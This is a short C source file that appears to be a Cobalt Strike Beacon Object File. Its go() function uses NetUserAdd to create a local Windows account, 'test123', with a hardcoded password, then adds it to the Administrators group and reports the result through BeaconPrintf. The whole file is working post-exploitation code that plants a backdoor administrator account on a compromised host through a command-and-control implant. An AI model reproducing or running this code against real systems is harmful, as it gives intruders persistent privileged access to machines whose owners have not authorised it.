#ifndef UNICODE
#define UNICODE
#endif

#include <windows.h>
#include <lm.h>
#include "beacon.h"

 typedef DWORD NET_API_STATUS;

DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetUserAdd(LPWSTR,DWORD,PBYTE,PDWORD);
DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetLocalGroupAddMembers(LPCWSTR,LPCWSTR,DWORD,PBYTE,DWORD);

void go(char * args, int alen) {

	USER_INFO_1 UserInfo;
	DWORD dwLevel = 1;
	DWORD dwError = 0;

	UserInfo.usri1_name = (TCHAR*)L"test123";            // 账户    
	UserInfo.usri1_password = (TCHAR*)L"Test@#123";      // 密码
	UserInfo.usri1_priv = USER_PRIV_USER;
	UserInfo.usri1_home_dir = NULL;
	UserInfo.usri1_comment = NULL;
	UserInfo.usri1_flags = UF_SCRIPT;
	UserInfo.usri1_script_path = NULL;

    NET_API_STATUS nStatus;

    nStatus = NETAPI32$NetUserAdd(
    	NULL, 
    	dwLevel, 
    	(LPBYTE)&UserInfo, 
    	&dwError
    	);
    if(nStatus == NERR_Success){
    	BeaconPrintf(CALLBACK_OUTPUT, "User has been successfully added", NULL);
    }else{
    	BeaconPrintf(CALLBACK_OUTPUT, "User added error %d", nStatus);
    }

    LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname = UserInfo.usri1_name;

	NET_API_STATUS aStatus;

	aStatus = NETAPI32$NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
	if(aStatus == NERR_Success){
    	BeaconPrintf(CALLBACK_OUTPUT, "User has been successfully added to Administrators", NULL);
    }else{
    	BeaconPrintf(CALLBACK_OUTPUT, "User added to Administrators error ", NULL);
    }
}